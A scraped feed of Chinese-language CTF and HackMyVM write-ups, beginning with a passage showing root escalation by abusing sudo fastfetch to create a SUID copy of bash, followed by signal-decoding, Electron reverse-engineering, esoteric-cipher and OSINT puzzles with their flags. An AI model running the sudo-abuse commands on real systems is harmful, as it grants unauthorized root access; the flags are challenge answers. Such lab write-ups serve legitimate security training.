从帮助信息中，`--command-text &lt;str&gt;` 这个选项允许我们执行任意命令，配合 `--structure 'command'` 就可以用 `fastfetch` 来执行我们想执行的命令了，并且是以`sudo`（即root）权限执行！

(为什么一定要加上`structure`，因为要使用它告诉`fastfetch`加载`command`)

利用这个特性，我们让`fastfetch`复制 `/bin/bash` 到 `/tmp/sh`，并给 `/tmp/sh` 加上SUID权限位。
```bash
qaq@eeeeeasy:~$ sudo /usr/bin/fastfetch --structure 'command' --command-text 'cp /bin/bash /tmp/sh &amp;&amp; chmod +s /tmp/sh'
       _,met$$$$$gg.
    ,g$$$$$$$$$$$$$$$P.
  ,g$$P'         '''Y$$.'.
 ,$$P'               `$$$.
',$$P       ,ggs.     `$$b:
`d$$'     ,$P''   .    $$$
 $$P      d$'     ,    $$$P
 $$:      $.   -    ,d$$'
 $$;      Y$b._   _,d$P'
 Y$$.    `.`'Y$$$$P''
 `$$b      '-.__
  `Y$$
   `Y$$.
     `$$b.
       `Y$$b.
          `'Y$b._
             `'''
```
检查一下 `/tmp/sh` 的权限：
```bash
qaq@eeeeeasy:~$ ls -la /tmp/
total 1184
drwxrwxrwt 10 root root    4096 May 17 05:14 .
drwxr-xr-x 18 root root    4096 Mar 18 20:37 ..
drwxrwxrwt  2 root root    4096 May 17 04:38 .font-unix
drwxrwxrwt  2 root root    4096 May 17 04:38 .ICE-unix
-rwsr-sr-x  1 root root 1168776 May 17 05:13 sh # &lt;--- SUID位已设置，所有者是root
drwx------  3 root root    4096 May 17 04:38 systemd-private-136e6172f431486383a8b142a9e39960-apache2.service-3yeZai
# ...
```
可以看到 `/tmp/sh` 已经是 `root` 用户所有，并且设置了SUID和SGID位。
现在直接执行 `/tmp/sh -p` 来获取root权限的shell (`-p` 参数使得bash不会因为euid不同而放弃特权)。

```bash
qaq@eeeeeasy:~$ /tmp/sh -p
sh-5.0# id
uid=1001(qaq) gid=1001(qaq) euid=0(root) egid=0(root) groups=0(root),1001(qaq)
```
Boom! `euid=0(root)`，成功拿到root权限！

最后一步，读取root flag：
```bash
sh-5.0# cat /root/root.txt 
flag{root-818a8bc5d566d7c856f14eec2791cd78}
```

收工！打完收flag，美滋滋！

sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/eeeeeasy%20-ba-ji-shen-tou-ce-shi-Writeup.html</guid><pubDate>Fri, 27 Jun 2025 09:30:05 +0000</pubDate></item><item><title>Challenge 20250526</title><link>https://7r1UMPHK.github.io/post/Challenge%2020250526.html</link><description>## 第一部分：分析 `ezflag` 文件

### 1. 初步文件检查

下载挑战附件，得到名为 `ezflag` 的文件。首先使用 `file` 命令探查其类型：

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ file ezflag
ezflag: ASCII text
```

结果显示为 `ASCII text`，这有些出乎意料，因为CTF中的flag相关文件通常是二进制、直接包含flag文本，或者需要特定工具打开的格式。既然是文本文件，我们用 `cat` 命令查看其内容：

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ cat ezflag
$timescale 1 us $end
$var wire 1 ! 0 $end
$var wire 1 ' 1 $end
$upscope $end
$enddefinitions $end
#0  1! 0'
#792  0!
#810  1!
#826  0!
#844  1!
#862  0!
#870  1!
#880  0!
#906  1!
#922  0!
#932  1!
#948  0!
#958  1!
#966  0!
#974  1!
#984  0!
#1018  1!
#1036  0!
#1044  1!
#1052  0!
#1062  1!
#1088  0!
#1104  1!
#1122  0!
#1132  1!
#1140  0!
#1148  1!
#1166  0!
#1174  1!
#1210  0!
#1218  1!
#1226  0!
#1236  1!
#1244  0!
#1262  1!
#1296  0!
#1304  1!
#1314  0!
#1356  1!
#1374  0!
#1392  1!
#1400  0!
#1410  1!
#1418  0!
#1426  1!
#1436  0!
#1444  1!
#1470  0!
#1478  1!
#1488  0!
#1496  1!
#1540  0!
#1548  1!
#1556  0!
#1566  1!
#1574  0!
#1600  1!
#1608  0!
#1618  1!
#1636  0!
#1652  1!
#1662  0!
#1678  1!
#1688  0!
#1704  1!
#1730  0!
#1740  1!
#1748  0!
#1756  1!
#1774  0!
#1792  1!
#1808  0!
#1826  1!
#1834  0!
#1844  1!
#1888  0!
#1896  1!
#1904  0!
#1914  1!
#1922  0!
#1940  1!
#1948  0!
#1966  1!
#1992  0!
#2000  1!
#2008  0!
#2018  1!
#2034  0!
#2052  1!
#2070  0!
#2086  1!
#2096  0!
#2122  1!
#2130  0!
#2140  1!
#2156  0!
#2174  1!
#2182  0!
#2192  1!
#2200  0!
#2226  1!
#2244  0!
#2260  1!
#2270  0!
#2278  1!
#2286  0!
#2312  1!
#2330  0!
#2348  1!
#2356  0!
#2364  1!
#2374  0!
#2392  1!
#2426  0!
#2434  1!
#2444  0!
#2452  1!
#2496  0!
#2504  1!
#2512  0!
#2522  1!
#2530  0!
#2548  1!
#2564  0!
#2574  1!
#2590  0!
#2608  1!
#2616  0!
#2660  1!
#2678  0!
#2696  1!
#2704  0!
#2748  1!
#2764  0!
#2782  1!
#2790  0!
#2816  1!
#2826  0!
#2842  1!
#2860  0!
#2868  1!
#2878  0!
#2886  1!
#2930  0!
#2938  1!
#2948  0!
#2956  1!
#2964  0!
#2990  1!
#3000  0!
#3008  1!
#3026  0!
#3042  1!
#3052  0!
#3060  1!
#3086  0!
#3094  1!
#3112  0!
#3130  1!
#3138  0!
#3148  1!
#3190  0!
#3200  1!
#3208  0!
#3216  1!
#3226  0!
#3234  1!
#3242  0!
#3268  1!
#3286  0!
#3304  1!
#3312  0!
#3356  1!
#3372  0!
#3390  1!
#3400  0!
#3416  1!
#3434  0!
#3442  1!
#3460  0!
#3478  1!
#3486  0!
#3494  1!
#3504  0!
#3530  1!
#3546  0!
#3564  1!
#3572  0!
#3582  1!
#3598  0!
#3624  1!
#3642  0!
#3652  1!
#3660  0!
#3668  1!
#3712  0!
#3720  1!
#3730  0!
#3738  1!
#3746  0!
#3772  1!
#3782  0!
#3790  1!
#3808  0!
#3824  1!
#3834  0!
#3850  1!
#3878  0!
#3886  1!
#3904  0!
#3912  1!
#3920  0!
#3946  1!
#3956  0!
#3964  1!
#3982  0!
#3998  1!
#4008  0!
#4016  1!
#4024  0!
#4050  1!
#4068  0!
#4086  1!
#4094  0!
#4102  1!
#4112  0!
#4130  1!
#4164  0!
#4172  1!
#4182  0!
#4190  1!
#4198  0!
#4208  1!
#4216  0!
#4224  1!
#4242  0!
#4260  1!
#4268  0!
#4276  1!
#4286  0!
#4312  1!
#4328  0!
#4346  1!
#4354  0!
#4364  1!
#4372  0!
#4380  1!
#4390  0!
#4398  1!
#4416  0!
#4434  1!
#4442  0!
#4450  1!
#4460  0!
#4494  1!
#4502  0!
#4520  1!
#4528  0!
#4538  1!
#4546  0!
#4554  1!
#4598  0!
#4606  1!
#4616  0!
#4634  1!
#4642  0!
#4650  1!
#4660  0!
#4694  1!
#5654
```

### 2. 理解文件内容与格式识别

文件内容包含以 `$` 开头的声明和以 `#` 开头的时间戳及信号值变化。这强烈暗示了一种记录数字电路仿真或逻辑分析仪捕获数据的格式。

#### 头部信息：

-   `$timescale 1 us $end`: 定义时间单位为 1 微秒 (µs)。
-   `$var wire 1 ! 0 $end`: 定义一个名为 `0` 的1位 `wire` (导线) 信号，其内部标识符为 `!`。
-   `$var wire 1 ' 1 $end`: 定义一个名为 `1` (注意前面有空格) 的1位 `wire` 信号，其内部标识符为 `'`。
-   `$upscope $end` 和 `$enddefinitions $end`: VCD 文件的标准结构。

#### 信号数据：

-   `#&lt;时间戳&gt;`: 表示在该时间点发生信号变化。
-   例如，`#0 1! 0'`: 在时间 0µs，信号 `!` (即信号 `0`) 变为 `1`，信号 `'` (即信号 `1`) 变为 `0`。
-   后续如 `#792 0!` 表示信号 `!` (信号 `0`) 变为 `0`，信号 `'` (信号 `1`) 状态保持不变，直到下一次显式更新。

通过这些特征，可以判断该文件是 **VCD (Value Change Dump)** 格式。这种文件常用于记录数字逻辑信号随时间变化的情况。

### 3. 使用 PulseView 解码

对于 VCD 文件，可以使用逻辑分析软件 PulseView (sigrok 套件的一部分) 进行可视化分析和解码。

#### 步骤一：导入数据到 PulseView

1.  启动 PulseView。
2.  通过 'File' -&gt; 'Open' (或拖拽) 打开 `ezflag` 文件。PulseView 通常能自动识别 VCD 格式。如果遇到识别问题，可尝试将文件后缀改为 `.vcd`。

#### 步骤二：分析波形并添加 UART 解码器

导入后，会看到两个信号通道，对应 VCD 文件中定义的信号 `0` (标识符 `!`) 和信号 `1` (标识符 `'`）。在 PulseView 中可能显示为 D0, D1 等。

1.  **观察波形特征：**
    仔细观察信号 `!` (在 PulseView 中可能是 D0) 的波形。它在 `#0` 时刻初始值为 `1`，之后随时间发生 `0` 和 `1` 的跳变。这种空闲时高电平 (或低电平)，数据传输时出现一系列电平快速切换的模式，非常符合**异步串行通信 (UART)** 的特征。
    *   根据 `#0 1! 0'`，信号 `!` (我们关注的 D0) 初始为 1，信号 `'` 初始为 0。后续数据主要改变的是 `!` 的状态。因此，信号 `!` 极有可能是 UART 的数据线 (TX/RX)。

2.  **添加 UART 解码器：**
    *   点击 PulseView 工具栏上的 'Add Decoder' 图标。
    *   在解码器列表中搜索并添加 'UART'。

#### 步骤三：配置 UART 解码器

这是解码成功的关键步骤。

1.  **映射信号线：**
    *   将 UART 解码器的 'TX' (或 'RX') 引脚连接到我们认为是数据线的通道，即代表信号 `!` (VCD 文件中的 `0`，PulseView 中的 D0) 的通道。

2.  **确定波特率 (Baud Rate)：**
    *   波特率是 UART 通信的核心参数。可以从常见的波特率开始尝试，如 9600, 19200, 38400, 57600, 115200 bps。
    *   在 PulseView 中修改解码器的波特率设置，解码结果会实时更新。通过观察解码输出是否为可读字符或有意义的数据来判断波特率是否正确。
    *   经过尝试，当波特率设置为 **115200 bps** 时，解码器输出了一串清晰的 ASCII 字符序列，并且没有错误帧。

3.  **其他参数（数据位、校验位、停止位）：**
    *   UART 通信最常见的配置是 **8 个数据位 (Data bits: 8)**，**无校验 (Parity: None)**，**1 个停止位 (Stop bits: 1)**，通常表示为 8N1。
    *   使用 115200 bps 波特率和 8N1 配置，解码结果良好。

#### 步骤四：查看解码结果

正确配置后，PulseView 会在波形下方显示解码出的数据。
![image-20250526134540784](https://7r1umphk.github.io/image/20250526134541010.webp)

将解码字符拼接，得到 Flag：
`flag{y0u_4r3_r3411y_600d_47_1061c_4n41y515!}`

## 第二部分：分析 `ezelectron` 应用

下载并解压 `ezelectron-1.1.0-amd64-linux.zip` 压缩包，解压查看其目录结构：

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ cd ezelectron
┌──(kali㉿kali)-[/mnt/hgfs/gx/ezelectron]
└─$ ll
total 242645
drwxr-xr-x 1 kali kali      4096 May 26 00:12 .
drwxr-xr-x 1 kali kali     12288 May 26 01:57 ..
-rwxr-xr-x 1 kali kali    147640 May 25 16:22 chrome_100_percent.pak
-rwxr-xr-x 1 kali kali 196984632 May 25 16:22 ezelectron
drwxr-xr-x 1 kali kali      4096 May 26 00:33 resources
```

运行应用，可以看到启动界面：
![1748239128506](https://7r1umphk.github.io/image/20250526135851284.webp)

界面左侧是 Vite.js (前端构建工具) 的 Logo，右侧是 Vue.js (JavaScript 前端框架) 的 Logo。这表明该应用是使用 Electron 框架，并结合 Vite 和 Vue.js 开发的。

### 方法一：通过修改主进程脚本启用开发者工具 (预期解)

对于 Electron 应用，一个常见的调试和分析入口是其内置的开发者工具。我们可以通过修改应用的主进程脚本来默认启动它。

#### 1. 解包 `app.asar`：

Electron 应用的核心逻辑通常打包在 `resources/app.asar` 文件中。`asar` 是一种归档格式。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/ezelectron]
└─$ npm install -g asar
┌──(kali㉿kali)-[/mnt/hgfs/gx/ezelectron]
└─$ cd resources
┌──(kali㉿kali)-[/mnt/hgfs/gx/ezelectron/resources]
└─$ ls -al
total 14348
drwxr-xr-x 1 kali kali        0 May 25 16:22 .
drwxr-xr-x 1 kali kali     4096 May 26 01:59 ..
-rwxr-xr-x 1 kali kali 14687457 May 25 16:22 app.asar
-rwxr-xr-x 1 kali kali       95 May 25 16:22 app-update.yml
┌──(kali㉿kali)-[/mnt/hgfs/gx/ezelectron/resources]
└─$ asar extract app.asar app_unpacked
```

#### 2. 修改主进程脚本：

解包后，在 `app_unpacked` 目录中找到主进程脚本。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/ezelectron/resources]
└─$ cd app_unpacked
┌──(kali㉿kali)-[/mnt/…/gx/ezelectron/resources/app_unpacked]
└─$ ll
total 6
drwxr-xr-x 1 kali kali    0 May 26 02:02 .
drwxr-xr-x 1 kali kali    0 May 26 02:02 ..
drwxr-xr-x 1 kali kali    0 May 26 02:02 dist
- rwxr-xr-x 1 kali kali 1434 May 26 02:02 main.min.js
drwxr-xr-x 1 kali kali 4096 May 26 02:02 node_modules
- rwxr-xr-x 1 kali kali  187 May 26 02:02 package.json
```

使用 `js-beautify`美化 `main.min.js` 以便于阅读和修改：

```bash
┌──(kali㉿kali)-[/mnt/…/gx/ezelectron/resources/app_unpacked]
└─$ js-beautify main.min.js &gt; main.beautified.js
```

编辑 `main.beautified.js`。在窗口显示 (`win.show()`) 之前/之后，添加以下代码以打开开发者工具：

```javascript
win.webContents.openDevTools();
```

![image-20250526140406708](https://7r1umphk.github.io/image/20250526140406895.webp)

保存修改，并将美化后的文件重命名回 `main.min.js` (如果修改的是美化版)。

```bash
┌──(kali㉿kali)-[/mnt/…/gx/ezelectron/resources/app_unpacked]
└─$ mv main.min.js main.min.js.bak
┌──(kali㉿kali)-[/mnt/…/gx/ezelectron/resources/app_unpacked]
└─$ mv main.beautified.js main.min.js
```

#### 3. 重新打包并运行：

返回 `resources` 目录，将修改后的 `app_unpacked` 目录重新打包为 `app.asar`。

```bash
┌──(kali㉿kali)-[/mnt/…/gx/ezelectron/resources/app_unpacked]
└─$ cd .. 
┌──(kali㉿kali)-[/mnt/hgfs/gx/ezelectron/resources]
└─$ mv app.asar app.asar.bak
┌──(kali㉿kali)-[/mnt/hgfs/gx/ezelectron/resources]
└─$ asar pack app_unpacked app.asar
```

现在，返回上层目录并运行修改后的 `ezelectron` 应用：

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/ezelectron/resources]
└─$ cd ..
┌──(kali㉿kali)-[/mnt/hgfs/gx/ezelectron]
└─$ ./ezelectron
```

应用启动时，开发者工具会自动打开。在 元素 标签页中检查 HTML 结构。注意到 Vue Logo (`class='logo vue'`) 的 `&lt;img&gt;` 标签，其 `alt` 属性包含 Flag。
![image-20250526140951570](https://7r1umphk.github.io/image/20250526140951753.webp)

Flag: `HMV{h3ll0_fr0m_3l3c7r0n}`

### 方法二：逆向分析渲染进程 JavaScript

此方法不依赖修改主进程，而是直接分析渲染进程加载的 JavaScript 代码。

#### 1. 定位渲染进程脚本：

在之前解包的 `app_unpacked/dist/` 目录下，可以找到 `index.html`。

```bash
┌──(kali㉿kali)-[/mnt/…/ezelectron/resources/app_unpacked/dist]
└─$ cat index.html
&lt;!doctype html&gt;
&lt;html lang='en'&gt;
  &lt;head&gt;
    &lt;meta charset='UTF-8' /&gt;
    &lt;link rel='icon' type='image/svg+xml' href='/vite.svg' /&gt;
    &lt;meta name='viewport' content='width=device-width, initial-scale=1.0' /&gt;
    &lt;title&gt;ezelectron&lt;/title&gt;
    &lt;script type='module' crossorigin src='./assets/index-CyqsCDPp.js'&gt;&lt;/script&gt; 
    &lt;link rel='stylesheet' crossorigin href='./assets/index-FMFiDxpK.css'&gt;
  &lt;/head&gt;
  &lt;body&gt;
    &lt;div id='app'&gt;&lt;/div&gt;
  &lt;/body&gt;
&lt;/html&gt;
```

主要的前端逻辑位于 `assets/index-CyqsCDPp.js`。

#### 2. 美化并分析脚本：

该脚本是混淆过的。使用 `js-beautify` 进行美化：

```bash
┌──(kali㉿kali)-[/mnt/…/resources/app_unpacked/dist/assets]
└─$ js-beautify index-CyqsCDPp.js &gt; index.beautified.js
```

打开 `index.beautified.js` 进行分析。

#### 3. 理解代码混淆与定位关键逻辑：

*   **字符串混淆：** 代码中存在一个大型字符串数组和一个解密/引用函数。
*   **变量名混淆：** 变量和函数名被替换为如 `a0_0x...` 或 `_0x...` 的形式。
*   **定位Vue组件：** 寻找 Vue 组件定义，通常是一个包含 `setup` 函数的对象。在本例中，对象 `a0_0x508586` 是一个 Vue 组件。
*   在其 `setup` 函数 (`_0x57c87a`) 中，注意到一个名为 `_0x8d8f10` 的内部函数。此函数接收两个数组 (`_0x1c013b` 和 `_0x76c466`) 作为输入，并进行了一系列操作来生成一个字符串。这个生成的字符串最终被设置为 Vue logo 图片的 `alt` 属性。

#### 4. 逆向 Flag 生成算法：

关键代码段如下:

```javascript
_0x1c013b = [
    省略
];
_0x76c466 = [省略 ];
function _0x8d8f10(_0x3816d4, _0xb6046) { 
    return _0x3816d4.flat() 
        .map((_0x39abff, _0x27f950) =&gt; 
            String.fromCharCode(
                (_0x39abff ^ _0xb6046[_0x27f950 % _0xb6046.length]) 
                - (0x1ba * -0x10 + -0xd3f * -0x2 + 0x123) 
            )
        )
        .join(''); 
}
```

#### 5. 计算数组值并编写解密脚本：

首先，计算 `_0x1c013b` 和 `_0x76c466` 的实际数值。可以在浏览器控制台环境中执行这些数学表达式。

```javascript
const _0x1c013b = [
[-0x13 * -0x56 + 0x26ca + -0x2d13, -0x214e + 0x1ed4 + 0x6b * 0x7, -0x1bfc + 0x5 * -0xa1 + 0x1f35, 0x259 * -0xb + -0x203a + 0x1 * 0x3a8a, 0x1d8b + -0x1 * -0x1646 + 0x4b2 * -0xb, 0x1580 + -0x1f67 + -0xa3d * -0x1, 0x125d + 0x1440 + -0x59 * 0x6f, -0x104b * -0x1 + -0x5 * -0x83 + -0x12b5, 0x1ba8 + 0x9 * -0x2a9 + 0x7 * -0x7a, 0x21f * 0x11 + -0x1 * -0x1495 + -0x3847],
[-0x2501 * -0x1 + 0x1 * -0x255d + 0x80, 0x1 * 0x12b6 + -0x5a * 0x18 + -0x9d4, 0x1cf5 + -0x151d * 0x1 + -0x765, 0x11 * -0x143 + 0x6cc + -0x47 * -0x35, 0x2 * 0x900 + 0x23 * 0xf + 0x1 * -0x1402, 0x1 * 0x148b + -0x1b52 + 0x743, -0x8b9 + -0x1060 + -0x11a * -0x17, 0x7 * -0xf1 + 0x854 + -0x1b4, -0x1 * 0x75f + 0x16 * -0x76 + -0x286 * -0x7],
[-0xaee + 0xdc3 + 0x4 * -0xa7, -0x23d4 + -0xb2f + 0x2f34, -0x1 * 0x198e + -0xb64 + 0xcb * 0x2f, -0x22a6 * -0x1 + 0xe5e + -0x3100, 0x893 + 0x1 * 0x779 + 0x1 * -0xfd6]
];
console.log('_0x1c013b:', _0x1c013b);
const _0x76c466 = [0x1fda + -0x82e + 0xd * -0x1cc, 0x8a1 + -0x2 * -0x416 + 0x5 * -0x350, 0xcc * -0x19 + -0x1bf0 + -0x301f * -0x1, 0x1f29 + 0xf50 + -0x173c * 0x2, -0xdea * -0x1 + -0x2316 + 0xd * 0x1a6, -0x1c4c + 0x19dc + 0x1 * 0x2d2, 0x206e + 0x9 * 0x31 + -0xfe * 0x22, -0x1683 + -0x835 + 0x1f00];
console.log('_0x76c466:', _0x76c466);
```

运行此脚本：

```
_0x1c013b:
[
[
25,
115,
20,
125,
43,
86,
6,
37,
97,
93
],
[
36,
114,
115,
12,
11,
124,
61,
9,
39
],
[
57,
49,
83,
4,
54
]
]
_0x76c466:
[
80,
61,
67,
1,
66,
98,
107,
72
]
```

然后解

```
const a = [
    [25, 115, 20, 125, 43, 86, 6, 37, 97, 93],
    [36, 114, 115, 12, 11, 124, 61, 9, 39],
    [57, 49, 83, 4, 54]
];
const b = [80, 61, 67, 1, 66, 98, 107, 72];
const c = a.flat();
function decode(d, e) {
    let f = '';
    for (let g = 0; g &lt; d.length; g++) {
        const h = g % e.length;
        const i = (d[g] ^ e[h]) - 1;
        f += String.fromCharCode(i);
    }
    return f;
}
const flag = decode(c, b);
console.log(flag);
```

![image-20250526141745643](https://7r1umphk.github.io/image/20250526141745824.webp)

Flag: `HMV{h3ll0_fr0m_3l3c7r0n}`

sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/Challenge%2020250526.html</guid><pubDate>Fri, 27 Jun 2025 09:30:02 +0000</pubDate></item><item><title>Challenge 052</title><link>https://7r1UMPHK.github.io/post/Challenge%20052.html</link><description>![image-20250622182158981](https://7r1umphk.github.io/image/20250622182159297.webp)

下载

```
┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ unzip 052.zip                                                            
Archive:  052.zip
 extracting: 052.png                 
  inflating: 052.txt                 
                                                                                                                                                                                   
┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ cat 052.txt 
Good morning agent X,
You have been selected for another important mission.
You need to locate a persons flight and the airport were he arrived.
We were able to get the date from his cellphone, but it appears encrypted with some sofisticated technique,
Have a great hunt agent X,
Sh4dowExe

RCdgQV4/XVxJO3tGV1Z3UzRRdHIwYG9vSmw3WiInRERCQkFSYWFfdSl5W1p2b3RtM3FTaS9tbGVNaWhhJ2VeY1wiIV9eQFxbVFN3VzlPTk1McEpPSGxGS0RDZypAZD49QjtAPzhcNjU0WDgxNjU0MyxQKilNbm0lSUg1

P.S.
We, also, were able to retrieve this:
6tmc`F^ZgDA8*0&amp;i%-!lFWbX7EZf1:+ELt4F)N1CATVs2%178mA8*/sASl@'+Cf&gt;1DKU&amp;8+Cf&gt;-+D5_'DBNP&amp;EdD:J%16TYAKYf'+C\c$FD5&lt;(+CfG7A7]RoASuU$+Co1/Eb0?5D_;

I’m sure that with your capabilities you can solve it.                                                                                                                                                                                   
```

```
RCdgQV4/XVxJO3tGV1Z3UzRRdHIwYG9vSmw3WiInRERCQkFSYWFfdSl5W1p2b3RtM3FTaS9tbGVNaWhhJ2VeY1wiIV9eQFxbVFN3VzlPTk1McEpPSGxGS0RDZypAZD49QjtAPzhcNjU0WDgxNjU0MyxQKilNbm0lSUg1
```

暂时看不出来是什么，我试了下XOR，无果

然后就尝试附件

```
6tmc`F^ZgDA8*0&amp;i%-!lFWbX7EZf1:+ELt4F)N1CATVs2%178mA8*/sASl@'+Cf&gt;1DKU&amp;8+Cf&gt;-+D5_'DBNP&amp;EdD:J%16TYAKYf'+C\c$FD5&lt;(+CfG7A7]RoASuU$+Co1/Eb0?5D_;
```

是base85

![image-20250622205039316](https://7r1umphk.github.io/image/20250622205039860.webp)

```
在这边，在那边，在那阴森的岩石上，
我看见长着角的魔鬼，手里拿着巨大的鞭子，
在后面残忍地鞭打着他们。
```

这段文字出自但丁的《神曲》中的《地狱篇》，具体是第十八篇的几行诗句。

后面扒拉了很久

然后终于发现了

```
RCdgQV4/XVxJO3tGV1Z3UzRRdHIwYG9vSmw3WiInRERCQkFSYWFfdSl5W1p2b3RtM3FTaS9tbGVNaWhhJ2VeY1wiIV9eQFxbVFN3VzlPTk1McEpPSGxGS0RDZypAZD49QjtAPzhcNjU0WDgxNjU0MyxQKilNbm0lSUg1
```

是base64
解出

```
D'`A^?]\I;{FWVwS4Qtr0`ooJl7Z''DDBBARaa_u)y[Zvotm3qSi/mleMiha'e^c\'!_^@\[TSwW9ONMLpJOHlFKDCg*@d&gt;=B;@?8\654X816543,P*)Mnm%IH5
```

然后搜索dante's inferno cipher（从附件中得知的信息）

你能找到这篇文章
https://bitvijays.github.io/Series_Capture_The_Flag/LFC-Cryptography.html#esoteric-programming-language
![image-20250622210908861](https://7r1umphk.github.io/image/20250622210909127.webp)

![image-20250622210925792](https://7r1umphk.github.io/image/20250622210926182.webp)

所以我搜索了一下这种编程

https://malbolge.doleczek.pl/

找到这个

一运行

![image-20250622211002462](https://7r1umphk.github.io/image/20250622211002853.webp)

```
10:11:2023:14:00
```

得到一个时间

然后就往前推了，找那个图片的信息

![052](https://7r1umphk.github.io/image/20250622211439549.webp)

勉强恢复了一下

直接google无果

看能不能通过时间反推吧

(尝试了很久，没有结果，暂时搁置)

后面问了群里的大佬，他们说是绿老哥给了一个网站找到的，我也扒拉不到所以先拿flag交了

```
HVM{Porto-OPO-Eindhoven-EIN-FR7472}
```

问到了

https://www.flightera.net/zh/flight/Ryanair-Porto-Eindhoven/FR7472/Oct-2023#flight_list

利用这个网站，我不做了，自己想想思路吧）

sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/Challenge%20052.html</guid><pubDate>Fri, 27 Jun 2025 09:29:59 +0000</pubDate></item><item><title>Challenge 051</title><link>https://7r1UMPHK.github.io/post/Challenge%20051.html</link><description>![image-20250622181457506](https://7r1umphk.github.io/image/20250622181505010.webp)

```
2zx42j1ji5x05cj64f2lt5zc56a6w0
```

CyberChef识别不了，就是意思是不是常见的

dcode是有一个识别密码的功能的，试试

https://www.dcode.fr/cipher-identifier

![image-20250622182033016](https://7r1umphk.github.io/image/20250622182033489.webp)

https://www.dcode.fr/twin-hex-cipher

![image-20250622182054951](https://7r1umphk.github.io/image/20250622182055419.webp)

```
HMV{4noth3r_C1pher}
```

sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/Challenge%20051.html</guid><pubDate>Fri, 27 Jun 2025 09:29:57 +0000</pubDate></item><item><title>Challenge 050</title><link>https://7r1UMPHK.github.io/post/Challenge%20050.html</link><description>![image-20250621131043433](https://7r1umphk.github.io/image/20250621131043717.webp)

```
┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ curl -i http://momo.hackmyvm.eu/0r1g04szt0p/                
HTTP/1.1 200 OK
Server: nginx/1.18.0
Date: Sat, 21 Jun 2025 05:54:19 GMT
Content-Type: text/html
Content-Length: 317
Last-Modified: Sun, 02 Jun 2024 17:47:47 GMT
Connection: keep-alive
ETag: '665cb043-13d'
Accept-Ranges: bytes

&lt;!DOCTYPE html&gt;
&lt;html lang='en'&gt;
&lt;head&gt;
    &lt;meta charset='UTF-8'&gt;
    &lt;title&gt;HackMyVM - Sertor&lt;/title&gt;
    &lt;link rel='icon' href='logo.png' type='image/png' sizes='16x16'&gt;
    &lt;link href='index.css' type='text/css' rel='stylesheet'&gt;
&lt;/head&gt;
&lt;body&gt;
&lt;p id='smoothkeyset'&gt;
    THIS LOOKS SO CLEAN!
&lt;/p&gt;
&lt;/body&gt;
&lt;/html&gt;
 
 ┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ curl -i http://momo.hackmyvm.eu/0r1g04szt0p/logo.png                                              
HTTP/1.1 404 Not Found
Server: nginx/1.18.0
Date: Sat, 21 Jun 2025 05:57:21 GMT
Content-Type: text/html
Content-Length: 153
Connection: keep-alive

&lt;html&gt;
&lt;head&gt;&lt;title&gt;404 Not Found&lt;/title&gt;&lt;/head&gt;
&lt;body&gt;
&lt;center&gt;&lt;h1&gt;404 Not Found&lt;/h1&gt;&lt;/center&gt;
&lt;hr&gt;&lt;center&gt;nginx/1.18.0&lt;/center&gt;
&lt;/body&gt;
&lt;/html&gt;
                                                                                                                                                                                   
┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ curl -i http://momo.hackmyvm.eu/0r1g04szt0p/index.css
HTTP/1.1 200 OK
Server: nginx/1.18.0
Date: Sat, 21 Jun 2025 05:57:39 GMT
Content-Type: text/css
Content-Length: 451
Last-Modified: Sun, 02 Jun 2024 17:48:30 GMT
Connection: keep-alive
ETag: '665cb06e-1c3'
Accept-Ranges: bytes

body
{
    background: rgb(123, 0, 128);
    background: linear-gradient(90deg, rgba(123, 0, 128, 1) 0%, rgba(205, 0, 187, 1) 34%, rgba(255, 0, 134, 1) 68%);
}

body #smoothkeyset
{
    position: absolute;
    right: 45vw;
    top: 45vh;

    color: white;
    font-family: 'Lucida Sans', 'dGhpc2lzbXlrZXkuY3NzLnR4dA==', sans-serif;
    font-size: large;
    font-style: italic;
    text-decoration: white underline solid 6px;
    cursor: default;
}

                                                                                                                                                                                   
┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ echo dGhpc2lzbXlrZXkuY3NzLnR4dA== |base64 -d
thisismykey.css.txt                                                                                                                                                                                   
┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ curl -i http://momo.hackmyvm.eu/0r1g04szt0p/thisismykey.css.txt
HTTP/1.1 200 OK
Server: nginx/1.18.0
Date: Sat, 21 Jun 2025 05:57:57 GMT
Content-Type: text/plain
Content-Length: 20
Last-Modified: Sun, 02 Jun 2024 17:48:38 GMT
Connection: keep-alive
ETag: '665cb076-14'
Accept-Ranges: bytes

HMV{wonderfulltext}
               
```

sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/Challenge%20050.html</guid><pubDate>Fri, 27 Jun 2025 09:29:54 +0000</pubDate></item><item><title>Challenge 049</title><link>https://7r1UMPHK.github.io/post/Challenge%20049.html</link><description>![image-20250621130059885](https://7r1umphk.github.io/image/20250621130100186.webp)

下载

```
┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ unzip 049.zip 
Archive:  049.zip
  inflating: ourobouros              
                                                                                                                                                                                   
┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ cat ourobouros
iVBORw0KGgoAAAANSUhEUgAAAysAAACJCAYAAAAsa6ckAAAABHNCSVQICAgIfAhkiAAAHhZJREFU
eJzt3Wd4FHX79vFzQxIhEBANYKEooIKgWKgWBIIEQifSpEkv0gNJKCpKS4j0EkJNQi/SEpLQu3or
KthvBelgAYLSU58X/uOjN0gyIZOd3f1+jsMXZufKXsPsZPfcnf1dtoyMjAwBAAAAgMW42bsBAAAA
ALgdwgoAAAAASyKsAAAAALAkwgoAAAAASyKsAAAAALAkwgoAAAAASyKsAAAAALAkwgoAAAAASyKs
